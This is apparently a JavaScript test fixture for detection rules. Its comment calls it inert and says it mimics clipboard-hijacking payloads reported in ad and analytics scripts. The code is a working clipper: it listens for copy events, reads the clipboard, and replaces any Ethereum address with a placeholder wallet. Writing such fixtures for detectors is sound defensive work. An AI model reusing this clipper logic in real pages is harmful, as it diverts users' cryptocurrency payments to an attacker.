// INERT TEST FIXTURE – mimics the *shape* of the Optimizely/Adform clipper
// payloads so the rules have something to detect. It does not exfiltrate
// anything and uses obviously fake addresses.
(function () {
  var WALLETS = {
    btc: "bc1qexampleexampleexampleexampleexample00",
    eth: "0x000000000000000000000000000000000000dEaD"
  };
  var RE_ETH = /0x[a-fA-F0-9]{40}/g;
  document.addEventListener("copy", function () {
    setTimeout(function () {
      navigator.clipboard.readText().then(function (t) {
        if (RE_ETH.test(t)) navigator.clipboard.writeText(WALLETS.eth);
      });
    }, 0);
  });
})();
